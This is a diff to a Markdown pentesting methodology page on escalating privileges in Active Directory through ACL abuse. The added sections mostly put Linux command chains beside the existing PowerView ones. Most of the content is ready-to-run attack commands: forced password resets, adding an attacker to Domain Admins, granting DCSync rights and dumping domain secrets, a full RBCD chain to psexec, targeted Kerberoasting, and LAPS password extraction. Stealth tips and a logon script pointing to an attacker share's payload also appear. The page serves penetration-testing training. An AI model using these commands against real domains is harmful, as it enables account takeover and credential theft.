@@ -5,7 +5,7 @@ category: Methodology
 subcategory: Active Directory Attack
 order: 1
 tags: ["active-directory", "pentesting", "acl-abuse", "privilege-escalation"]
-updated: 2026-04-11
+updated: 2026-04-21
 ---
 
 # Part 1: Exploiting Permission Delegation
@@ -26,7 +26,7 @@ Upload your collection data and run built-in queries:
 - *Find Principals with DCSync Rights*
 - *Shortest Path from Kerberoastable Users*
 
-### PowerView
+### PowerView (from Windows)
 
 ```powershell
 # Find all interesting ACLs in the domain
@@ -43,6 +43,23 @@ Get-DomainObjectAcl -Identity targetuser -ResolveGUIDs | ? {
 }
 ```
 
+### From Linux / Kali
+
+```bash
+# BloodHound collection — same data PowerView exposes, queryable in the GUI
+bloodhound-python -u user -p pass -d domain.local -ns DC_IP -dc dc01.domain.local -c All
+
+# NetExec built-in BloodHound collector (one command, no Python wrapper)
+nxc ldap DC_IP -u user -p pass -d domain.local --bloodhound -c All --dns-server DC_IP
+
+# dacledit — read ACLs on any object directly (Impacket fork)
+dacledit.py domain.local/user:pass -target 'Domain Admins' -dc-ip DC_IP -action read
+
+# Raw LDAP query if no BloodHound — filter ntSecurityDescriptor manually
+ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w pass \
+  -b "DC=domain,DC=local" "(sAMAccountName=targetuser)" ntSecurityDescriptor
+```
+
 ---
 
 ## Attack: GenericAll
@@ -52,6 +69,8 @@ Get-DomainObjectAcl -Identity targetuser -ResolveGUIDs | ? {
 **What it means:** Full control over the target object. You can do *anything* — reset passwords, modify group membership, set SPNs, write attributes.
 
 ### GenericAll on a User
+
+**From Windows (PowerView):**
 
 ```powershell
 # Option 1: Reset their password
@@ -68,7 +87,28 @@ Set-DomainObject -Identity targetuser -Clear serviceprincipalname
 Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}
 ```
 
+**From Linux / Kali:**
+
+```bash
+# Option 1: Reset password via SAMR
+net rpc password targetuser 'NewP@ssw0rd!' -U 'domain.local/attacker%pass' -S DC_IP
+# or via Impacket
+changepasswd.py domain.local/targetuser@DC_IP -newpass 'NewP@ssw0rd!'
+
+# Option 2: Targeted Kerberoast — set SPN + roast in one shot
+targetedKerberoast.py -u user -p pass -d domain.local --dc-ip DC_IP
+# hashcat -m 13100 kerberoast.txt rockyou.txt
+
+# Option 3: Targeted AS-REP Roast — flip DONT_REQ_PREAUTH bit
+bloodyAD -u user -p pass -d domain.local --host DC_IP add uac targetuser -f DONT_REQ_PREAUTH
+GetNPUsers.py domain.local/targetuser -no-pass -dc-ip DC_IP -format hashcat
+# Flip the bit back when done
+bloodyAD -u user -p pass -d domain.local --host DC_IP remove uac targetuser -f DONT_REQ_PREAUTH
+```
+
 ### GenericAll on a Group
+
+**From Windows (PowerView):**
 
 ```powershell
 # Add yourself directly
@@ -78,15 +118,66 @@ Add-DomainGroupMember -Identity "Domain Admins" -Members attackeruser
 Get-DomainGroupMember -Identity "Domain Admins"
 ```
 
+**From Linux / Kali:**
+
+```bash
+# Add a member with net rpc (SAMR)
+net rpc group addmem 'Domain Admins' attacker -U 'domain.local/attacker%pass' -S DC_IP
+
+# Or with bloodyAD (LDAP writes — no SMB needed)
+bloodyAD -u user -p pass -d domain.local --host DC_IP add groupMember 'Domain Admins' attacker
+
+# Verify
+nxc ldap DC_IP -u user -p pass -M groupmembership -o GROUP='Domain Admins'
+```
+
 ### GenericAll on a Computer
 
+Two paths: **LAPS** (if deployed) or **RBCD**. Always check LAPS first — it's one command vs. four steps.
+
+**Fast path — LAPS (see the full LAPS section below):**
+
+```bash
+# If LAPS is deployed, GenericAll → read LAPS → local admin
+nxc ldap DC_IP -u user -p pass --laps
+# Use the returned password directly
+nxc smb TARGET_IP -u Administrator -p 'LAPS_PASSWORD' --local-auth
+```
+
+**Fallback — RBCD from Windows (PowerView):**
+
 ```powershell
-# Configure RBCD to yourself (see Part 3 for full RBCD chain)
+# Configure RBCD to yourself (you need a computer account too)
 $sid = Get-DomainComputer YOURPC -Properties objectsid | Select -Expand objectsid
 $sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
 $bytes = New-Object byte[] ($sd.BinaryLength)
 $sd.GetBinaryForm($bytes, 0)
 Set-DomainObject -Identity TARGETPC -Set @{'msds-allowedtoactonbehalfofotheridentity'=$bytes}
+```
+
+**Fallback — Full RBCD chain from Linux:**
+
+```bash
+# Step 1: Create a fake computer account (default quota: 10 per user)
+impacket-addcomputer domain.local/user:pass \
+  -computer-name 'FAKEPC$' -computer-pass 'Password123' -dc-ip DC_IP
+
+# Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET
+impacket-rbcd domain.local/user:pass \
+  -delegate-to 'TARGET$' -delegate-from 'FAKEPC$' -action write -dc-ip DC_IP
+
+# Step 3: S4U2Self + S4U2Proxy as Administrator
+impacket-getST domain.local/'FAKEPC$':'Password123' \
+  -spn cifs/target.domain.local -impersonate Administrator -dc-ip DC_IP
+
+# Step 4: Use the ticket
+export KRB5CCNAME=Administrator@cifs_target.domain.local@DOMAIN.LOCAL.ccache
+impacket-secretsdump -k -no-pass target.domain.local
+impacket-psexec -k -no-pass domain.local/administrator@target.domain.local
+
+# Cleanup
+impacket-rbcd domain.local/user:pass \
+  -delegate-to 'TARGET$' -delegate-from 'FAKEPC$' -action remove -dc-ip DC_IP
 ```
 
 ---
@@ -99,6 +190,8 @@ Set-DomainObject -Identity TARGETPC -Set @{'msds-allowedtoactonbehalfofotheriden
 
 ### On a User
 
+**Windows (PowerView):**
+
 ```powershell
 # Set SPN for Kerberoasting (targeted Kerberoast)
 Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='http/fake'}
@@ -107,12 +200,21 @@ Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='http/fake'}
 Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\share\payload.exe'}
 ```
 
+**Linux:**
+
+```bash
+# Set an SPN then Kerberoast (all-in-one)
+targetedKerberoast.py -u user -p pass -d domain.local --dc-ip DC_IP
+
+# Or write the attribute manually with bloodyAD
+bloodyAD -u user -p pass -d domain.local --host DC_IP set object targetuser servicePrincipalName -v 'http/fake'
+GetUserSPNs.py domain.local/user:pass -request-user targetuser -dc-ip DC_IP
+bloodyAD -u user -p pass -d domain.local --host DC_IP remove object targetuser servicePrincipalName -v 'http/fake'
+```
+
 ### On a Computer
 
-```powershell
-# Write msDS-AllowedToActOnBehalfOfOtherIdentity → RBCD attack
-# (same as GenericAll on computer — see above)
-```
+Same targets as GenericAll on Computer — **LAPS read** (if deployed) or **RBCD** (write `msDS-AllowedToActOnBehalfOfOtherIdentity`). See the GenericAll on a Computer section above for the full Linux + Windows chains.
 
 ---
 
@@ -121,6 +223,8 @@ Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\share\payloa
 **Severity:** 🔴 Critical
 
 **What it means:** You can modify the ACL itself. Grant yourself GenericAll, then do whatever you want.
+
+**Windows (PowerView):**
 
 ```powershell
 # Step 1: Grant yourself GenericAll on the target
@@ -131,9 +235,24 @@ Add-DomainObjectAcl -TargetIdentity "Domain Admins" \
 Add-DomainGroupMember -Identity "Domain Admins" -Members attackeruser
 ```
 
+**Linux (dacledit + bloodyAD):**
+
+```bash
+# Step 1: Grant yourself FullControl on the target
+dacledit.py domain.local/user:pass \
+  -target 'Domain Admins' -principal attacker \
+  -action write -rights FullControl -dc-ip DC_IP
+
+# Step 2: Add yourself to the group
+bloodyAD -u attacker -p pass -d domain.local --host DC_IP \
+  add groupMember 'Domain Admins' attacker
+```
+
 ### WriteDACL on the Domain Object
 
 This is especially dangerous — you can grant yourself **DCSync** rights:
+
+**Windows (PowerView):**
 
 ```powershell
 # Grant DCSync rights
@@ -143,8 +262,18 @@ Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
 
 # Now DCSync
 mimikatz "lsadump::dcsync /domain:domain.local /user:krbtgt"
-# or
-secretsdump.py domain.local/attackeruser:pass@dc01.domain.local
+```
+
+**Linux:**
+
+```bash
+# Grant DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
+dacledit.py domain.local/user:pass \
+  -target-dn 'DC=domain,DC=local' -principal attacker \
+  -action write -rights DCSync -dc-ip DC_IP
+
+# Now DCSync
+impacket-secretsdump domain.local/attacker:pass@DC_IP -just-dc
 ```
 
 ---
@@ -157,6 +286,8 @@ secretsdump.py domain.local/attackeruser:pass@dc01.domain.local
 
 **Chain:** WriteOwner → WriteDACL → GenericAll
 
+**Windows (PowerView):**
+
 ```powershell
 # Step 1: Take ownership
 Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity attackeruser
@@ -167,6 +298,23 @@ Add-DomainObjectAcl -TargetIdentity "Domain Admins" \
 
 # Step 3: Add yourself
 Add-DomainGroupMember -Identity "Domain Admins" -Members attackeruser
+```
+
+**Linux (owneredit + dacledit + bloodyAD):**
+
+```bash
+# Step 1: Take ownership
+owneredit.py domain.local/user:pass \
+  -target 'Domain Admins' -new-owner attacker -dc-ip DC_IP
+
+# Step 2: Grant yourself FullControl
+dacledit.py domain.local/attacker:pass \
+  -target 'Domain Admins' -principal attacker \
+  -action write -rights FullControl -dc-ip DC_IP
+
+# Step 3: Add yourself to the group
+bloodyAD -u attacker -p pass -d domain.local --host DC_IP \
+  add groupMember 'Domain Admins' attacker
 ```
 
 ---
@@ -184,9 +332,22 @@ Set-DomainUserPassword -Identity targetuser \
 
 # net command
 net user targetuser 'NewP@ss123!' /domain
+```
 
-# Impacket (from Linux)
+```bash
+# Impacket (from Linux) — requires old pass or hash
 changepasswd.py domain.local/targetuser:'oldpass'@dc01 -newpass 'NewP@ss123!'
+
+# Impacket — reset as another user you already control
+changepasswd.py -reset domain.local/attacker:'attackerpass'@dc01 \
+  -altuser attacker -altpass 'attackerpass' -target targetuser -newpass 'NewP@ss123!'
+
+# Samba net rpc — pass-through using your own creds
+net rpc password targetuser 'NewP@ss123!' -U 'domain.local/attacker%pass' -S DC_IP
+
+# bloodyAD — LDAP-based password reset (no SMB)
+bloodyAD -u attacker -p pass -d domain.local --host DC_IP \
+  set password targetuser 'NewP@ss123!'
 ```
 
 > ⚠️ **OPSEC Warning:** Resetting passwords is noisy — the user will notice they can't log in. Prefer Kerberoasting (set SPN) or delegation abuse when stealth matters.
@@ -199,6 +360,8 @@ changepasswd.py domain.local/targetuser:'oldpass'@dc01 -newpass 'NewP@ss123!'
 
 **What it means:** Add any user (or yourself, with `AddSelf`) to a group.
 
+**Windows (PowerView):**
+
 ```powershell
 # Add yourself to a privileged group
 Add-DomainGroupMember -Identity "Server Operators" -Members attackeruser
@@ -206,6 +369,20 @@ Add-DomainGroupMember -Identity "Backup Operators" -Members attackeruser
 
 # Verify
 Get-DomainGroupMember -Identity "Server Operators" | select MemberName
+```
+
+**Linux:**
+
+```bash
+# Samba net rpc
+net rpc group addmem 'Server Operators' attacker -U 'domain.local/attacker%pass' -S DC_IP
+
+# bloodyAD
+bloodyAD -u attacker -p pass -d domain.local --host DC_IP \
+  add groupMember 'Backup Operators' attacker
+
+# Verify
+nxc ldap DC_IP -u user -p pass -M groupmembership -o GROUP='Server Operators'
 ```
 
 ### Interesting Groups to Target
@@ -226,15 +403,99 @@ Get-DomainGroupMember -Identity "Server Operators" | select MemberName
 
 **Severity:** 🟠 High
 
-**What it means:** Includes both `ForceChangePassword` and the ability to read LAPS passwords.
+**What it means:** Grants every *extended right* at once — including `User-Force-Change-Password` (on users) and the LAPS password read right (on computers). On a user → reset the password (see ForceChangePassword above). On a computer → read LAPS. See the dedicated LAPS section below.
+
+---
+
+## Attack: Reading LAPS Passwords
+
+**Severity:** 🟠 High
+
+LAPS (Local Administrator Password Solution) stores a unique, rotating local Administrator password for each domain-joined machine — in Active Directory. If you have the right permissions (GenericAll, AllExtendedRights, or an explicit read right on the LAPS attribute), you can pull those passwords straight out of LDAP and log in as local admin.
+
+### What LAPS Is
+
+LAPS rotates the local Administrator password and stores it as an attribute on the computer object. Two versions exist:
+
+| Version | Attribute | Storage |
+|---|---|---|
+| LAPS v1 (Legacy) | `ms-Mcs-AdmPwd` | Plaintext |
+| LAPS v2 (Windows LAPS) | `msLAPS-Password` | JSON (plaintext by default, optional DPAPI encryption) |
+
+### Who Can Read LAPS
+
+- Anyone with **GenericAll** on the computer object
+- Anyone with **AllExtendedRights** on the computer object
+- Accounts explicitly granted read on the LAPS attribute
+- Members of groups delegated LAPS read access (often helpdesk / tier-2 admins)
+
+### Enumeration — Is LAPS Deployed?
+
+```bash
+# Check if the LAPS schema extension exists and which computers have passwords
+nxc ldap DC_IP -u user -p pass -M laps
+
+# Raw LDAP — list all LAPS-enrolled computers
+ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w pass \
+  -b "DC=domain,DC=local" "(ms-Mcs-AdmPwdExpirationTime=*)" cn
+
+# From Windows — who can read the attribute on a given OU?
+Find-AdmPwdExtendedRights -Identity "OU=Servers,DC=domain,DC=local"
+```
+
+### Read the Password
+
+```bash
+# nxc — easiest (dumps every LAPS password your account can read)
+nxc ldap DC_IP -u user -p pass --laps
+
+# nxc module (more verbose output incl. expiration)
+nxc ldap DC_IP -u user -p pass -M laps
+
+# Raw LDAP query
+ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w pass \
+  -b "DC=domain,DC=local" "(ms-Mcs-AdmPwd=*)" cn ms-Mcs-AdmPwd
+
+# Windows LAPS v2
+ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w pass \
+  -b "DC=domain,DC=local" "(msLAPS-Password=*)" cn msLAPS-Password
+```
 
 ```powershell
-# Read LAPS password
-Get-DomainComputer TARGET -Properties ms-Mcs-AdmPwd | select ms-Mcs-AdmPwd
+# From Windows — PowerView
+Get-DomainComputer TARGET -Properties ms-Mcs-AdmPwd | select dnshostname, ms-Mcs-AdmPwd
 
-# Or via CrackMapExec
-crackmapexec ldap dc01 -u user -p pass -M laps
+# LAPS v2 module
+Get-LapsADPassword -Identity TARGET -AsPlainText
 ```
+
+### Use the Password
+
+LAPS gives you the **local Administrator** of the target — not a domain account. Authenticate with `--local-auth`:
+
+```bash
+# Check it works
+nxc smb TARGET_IP -u Administrator -p 'LAPS_PASSWORD' --local-auth
+
+# Shell
+evil-winrm -i TARGET_IP -u Administrator -p 'LAPS_PASSWORD'
+
+# Dump SAM / LSA secrets on the target
+nxc smb TARGET_IP -u Administrator -p 'LAPS_PASSWORD' --local-auth --sam
+nxc smb TARGET_IP -u Administrator -p 'LAPS_PASSWORD' --local-auth --lsa
+impacket-secretsdump Administrator:'LAPS_PASSWORD'@TARGET_IP
+```
+
+### Why LAPS Is the Shortcut
+
+If you have GenericAll on a computer, **always check LAPS first** before setting up RBCD:
+
+| Path | Steps | Caveats |
+|---|---|---|
+| LAPS read | 1 command → local admin | Needs LAPS actually deployed on that host |
+| RBCD | create computer account → write attribute → S4U → psexec | Needs `MachineAccountQuota > 0` or an existing computer account |
+
+LAPS is one LDAP query. RBCD is four steps and leaves a machine account behind.
 
 ---
 
